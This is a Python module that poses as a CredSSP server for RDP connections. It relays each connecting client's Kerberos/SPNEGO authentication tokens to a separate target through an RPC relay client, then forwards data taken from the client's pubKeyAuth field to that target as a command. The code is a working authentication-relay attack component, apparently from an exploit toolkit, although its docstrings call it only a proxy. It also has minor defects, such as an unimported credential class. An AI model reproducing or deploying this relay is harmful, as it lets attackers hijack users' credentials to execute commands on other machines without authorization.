"""
This is the main module that is responsible on CredSSP protocol from the server side.
"""
import thread
from threading import Thread
from pyasn1.type import namedtype, univ, tag
import pyasn1.codec.der.encoder as der_encoder
import pyasn1.codec.der.decoder as der_decoder
import pyasn1.codec.ber.encoder as ber_encoder

from rdpy.core.type import Stream
from twisted.internet import protocol
from OpenSSL import crypto
from rdpy.security import x509
from rdpy.core import error,type
import struct
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech, MechTypes, SPNEGO_NegTokenResp, ASN1_AID, ASN1_SUPPORTED_MECH
from impacket.smbserver import *
from impacket.smb3structs import *
from impacket.smb3 import *
from impacket import ntlm
from rpc_relay import RPCRelayClient
from rdpy.core import log
from cssp import TSRequest,NegoToken,decodeDERTRequest,NegoData

def encodeDERTRequest(negoTypes = [], authInfo = None, pubKeyAuth = None):
    """
    @summary: create TSRequest from list of Type
    @param negoTypes: {list(Type)}
    @param authInfo: {str} authentication info TSCredentials encrypted with authentication protocol
    @param pubKeyAuth: {str} public key encrypted with authentication protocol
    @return: {str} TRequest der encoded
    """
    negoData = NegoData().subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 1))

    #fill nego data tokens
    i = 0
    for negoType in negoTypes:
        negoToken = NegoToken()
        negoToken.setComponentByPosition(0, negoType) #changed might need to be OctectString
        negoData.setComponentByPosition(i, negoToken)
        i += 1

    request = TSRequest()
    request.setComponentByName("version", univ.Integer(2).subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 0)))

    if i > 0:
        request.setComponentByName("negoTokens", negoData)

    if not authInfo is None:
        request.setComponentByName("authInfo", univ.OctetString(authInfo).subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 2)))

    if not pubKeyAuth is None:
        request.setComponentByName("pubKeyAuth", univ.OctetString(pubKeyAuth).subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 3)))

    return der_encoder.encode(request)

def decodeDERTRequest(s):
    """
    @summary: Decode the stream as
    @param s: {str}
    """
    return der_decoder.decode(s, asn1Spec=TSRequest())[0]

def getNegoTokens(tRequest):
    negoData = tRequest.getComponentByName("negoTokens")
    return [Stream(negoData.getComponentByPosition(i).getComponentByPosition(0).asOctets()) for i in range(len(negoData))]

def getPubKeyAuth(tRequest):
    return tRequest.getComponentByName("pubKeyAuth").asOctets()

def encodeDERTCredentials(domain, username, password):
    passwordCred = TSPasswordCreds()
    passwordCred.setComponentByName("domainName", univ.OctetString(domain).subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 0)))
    passwordCred.setComponentByName("userName", univ.OctetString(username).subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 1)))
    passwordCred.setComponentByName("password", univ.OctetString(password).subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 2)))

    credentials = TSCredentials()
    credentials.setComponentByName("credType", univ.Integer(1).subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 0)))
    credentials.setComponentByName("credentials", univ.OctetString(der_encoder.encode(passwordCred)).subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 1)))

    return der_encoder.encode(credentials)

class States:
    Krb0=0 #In this state , we will send the bytes in the bind request
    Krb1=1 #In this state, we will send the bytes in the alter context
    Final=2

class CSSPSrv(object):
    """
    @summary: Handle CSSP connection
    Proxy class for authentication
    """
    def __init__(self ,listener,transport,target):
        """
        @param layer: {type.Layer.RawLayer}
        @param authenticationProtocol: {sspi.IAuthenticationProtocol}
        """
        self.state=0
        self._listener=listener
        self.transport=transport
        self.wrapped=0
        self._relay=RPCRelayClient(target)
        self._relay.init_connection()

        self.recv=self.Recv #first recv


    def Recv(self,data,secFlags):
        #fixing the first bytes that we haven't got
        if len(data.buf)>255:
            buff2='\x30\x82'+struct.pack('>H',len(data.buf))+data.buf #for now, it is two bytes that are lost in tpkt.readHeader
        elif len(data.buf)>=0x80:
            buff2='\x30\x81'+chr(len(data.buf))+data.buf
        else:
            buff2='\x30'+chr(len(data.buf))+data.buf #for now, it is two bytes that are lost in tpkt.readHeader

        tsreq = decodeDERTRequest(buff2) #should add length
        if self.state==States.Final:
            return
        negToken=str(tsreq['negoTokens'][0]['negoToken']) #first neg token, bytes string
        if self.state==States.Krb0 or self.state==States.Krb1:
            ret=self.HandleKrb(negToken)

            pubKeyExists=False
            try:
                tsreq.getComponentByName('pubKeyAuth')
                pubKeyExists=True
            except:
                pass

            if pubKeyExists and tsreq['pubKeyAuth']!=None and tsreq['pubKeyAuth'].hasValue():
                cmd=str(tsreq['pubKeyAuth'])
                self._relay.sendCmd(cmd)
                self.state=States.Final
                return

            self.state=States.Krb1

            if ret:
                self.SendResp(ret) #no need to wait
            return

    def HandleKrb(self,negToken):
        if self.state==States.Krb0:
            resp,bind= self._relay.sendNegotiate(str(negToken))
            self.bind=(bind)
            return resp

        if self.state==States.Krb1:
            auth=self._relay.sendAuth(str(negToken),self.bind)
            return auth


    def SendResp(self,message):
        t=encodeDERTRequest( negoTypes = [ message, ])
        t='\x30'+t[1:] #to replace it for TSRequest
        self.transport.write(type.String(t))
